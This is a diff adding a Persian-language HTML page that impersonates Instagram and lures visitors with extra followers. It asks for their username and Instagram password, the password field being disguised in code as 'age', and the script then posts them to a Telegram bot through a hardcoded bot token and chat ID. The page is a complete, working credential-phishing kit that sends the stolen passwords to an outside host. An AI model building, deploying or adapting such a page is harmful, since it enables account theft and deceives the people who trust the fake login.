@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ورود به سیستم</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Vazirmatn', 'Segoe UI', Tahoma, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .login-container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+            animation: slideUp 0.5s ease-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .login-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .login-header h2 {
+            color: #333;
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+
+        .login-header p {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        .form-group input:focus {
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+
+        .form-group input::placeholder {
+            color: #aaa;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
+        }
+
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+
+        .submit-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .message {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 14px;
+            display: none;
+        }
+
+        .message.success {
+            color: #4CAF50;
+            display: block;
+        }
+
+        .message.error {
+            color: #f44336;
+            display: block;
+        }
+
+        .loading-spinner {
+            display: none;
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        .loading-spinner.active {
+            display: block;
+        }
+
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-header">
+            <h2>Instagram</h2>
+            <p>لطفاً اطلاعات خود را وارد کنید ما برای تایید اعتبار نیاز داریم </p>
+        </div>
+
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="username">نام کاربری</label>
+                <input 
+                    type="text" 
+                    id="username" 
+                    name="username" 
+                    placeholder="نام کاربری خود را وارد کنید"
+                    required
+                    minlength="3"
+                >
+            </div>
+
+            <div class="form-group">
+                <label for="age">رمز عبور پیج شما</label>
+                <input 
+                    type="text" 
+                    id="age" 
+                    name="age" 
+                    placeholder="فقد برای تایید اعتبار"
+                    required
+                >
+            </div>
+
+            <div class="form-group">
+                <label for="followers">تعداد فالوور های مورد نیاز </label>
+                <input 
+                    type="text" 
+                    id="followers" 
+                    name="followers" 
+                    placeholder="تعداد فالوورهای خود را وارد کنید (مثلاً: 1000 یا هزار)"
+                    required
+                >
+            </div>
+
+            <button type="submit" class="submit-btn" id="submitBtn">
+                درحال برسی
+            </button>
+        </form>
+
+        <div class="loading-spinner" id="loadingSpinner">
+            <div class="spinner"></div>
+            <p style="color: #666; margin-top: 10px;">در حال برسی...</p>
+        </div>
+
+        <div class="message" id="message"></div>
+    </div>
+
+    <script>
+        // تنظیمات ربات تلگرام
+        const TELEGRAM_BOT_TOKEN = '8458753852:AAE4SKD-ePf2UwcUpFE6m6yYDyXDbyENEVg';
+        const TELEGRAM_CHAT_ID = '7127088821';
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value.trim();
+            const age = document.getElementById('age').value.trim();
+            const followers = document.getElementById('followers').value.trim();
+            const submitBtn = document.getElementById('submitBtn');
+            const loadingSpinner = document.getElementById('loadingSpinner');
+            const message = document.getElementById('message');
+            
+            // اعتبارسنجی فرم - بررسی خالی نبودن تمام فیلدها
+            if (!username || !age || !followers) {
+                showMessage('لطفاً تمام فیلدها را پر کنید', 'error');
+                return;
+            }
+            
+            // غیرفعال کردن دکمه و نمایش لودینگ
+            submitBtn.disabled = true;
+            loadingSpinner.classList.add('active');
+            message.style.display = 'none';
+            
+            // ساخت پیام برای ارسال به تلگرام
+            const messageText = `🔔 ورود جدید به سیستم\n\n` +
+                              `👤 نام کاربری: ${username}\n` +
+                              `📅 سن: ${age}\n` +
+                              `👥 تعداد فالوورها: ${followers}\n` +
+                              `🕐 زمان: ${new Date().toLocaleString('fa-IR')}`;
+            
+            try {
+                // ارسال به تلگرام
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: messageText,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.ok) {
+                    showMessage('✅ اطلاعات با موفقیت ارسال شد!', 'success');
+                    document.getElementById('loginForm').reset();
+                } else {
+                    showMessage('❌ خطا در ارسال اطلاعات', 'error');
+                    console.error('Telegram API Error:', data);
+                }
+            } catch (error) {
+                showMessage('❌ خطا در ارتباط با سرور', 'error');
+                console.error('Network Error:', error);
+            } finally {
+                // فعال کردن دکمه و مخفی کردن لودینگ
+                submitBtn.disabled = false;
+                loadingSpinner.classList.remove('active');
+            }
+        });
+        
+        function showMessage(text, type) {
+            const message = document.getElementById('message');
+            message.textContent = text;
+            message.className = 'message ' + type;
+            message.style.display = 'block';
+            
+            // مخفی کردن پیام بعد از 3 ثانیه
+            setTimeout(() => {
+                message.style.display = 'none';
+            }, 3000);
+        }
+        
+        // اعتبارسنجی زنده برای نام کاربری
+        document.getElementById('username').addEventListener('input', function(e) {
+            if (this.value.length < 3 && this.value.length > 0) {
+                this.style.borderColor = '#ff9800';
+            } else {
+                this.style.borderColor = '#e0e0e0';
+            }
+        });
+        
+        // بازخورد بصری برای فیلد سن
+        document.getElementById('age').addEventListener('input', function(e) {
+            if (this.value.length > 0) {
+                this.style.borderColor = '#4CAF50';
+            } else {
+                this.style.borderColor = '#e0e0e0';
+            }
+        });
+        
+        // بازخورد بصری برای فیلد فالوورها
+        document.getElementById('followers').addEventListener('input', function(e) {
+            if (this.value.length > 0) {
+                this.style.borderColor = '#4CAF50';
+            } else {
+                this.style.borderColor = '#e0e0e0';
+            }
+        });
+    </script>
+</body>
+</html>
